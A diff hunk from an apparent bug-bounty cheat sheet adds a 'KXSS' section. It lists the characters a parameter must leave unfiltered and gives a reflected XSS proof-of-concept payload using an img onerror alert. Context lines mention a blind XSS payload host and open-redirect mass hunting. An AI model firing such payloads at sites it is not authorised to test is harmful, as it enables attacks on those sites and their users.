@@ -65,6 +65,16 @@ cat urls.txt        --> read the file
 -b xalgord.xss.ht   --> BXSS payload adder.
 ```
 
+### KXSS
+
+The vulnerable parameter for XSS should have Unfiltered : **\[“ ‘ < > $ | ( ) \` : ; { } ]**
+
+**Payload:**&#x20;
+
+```
+"><img%20src=x%20onerror="alert(%27POC%20By%20Xalgord%27)"
+```
+
 ### Open Redirect Mass Hunt
 
 * tool = ragno, qsreplace
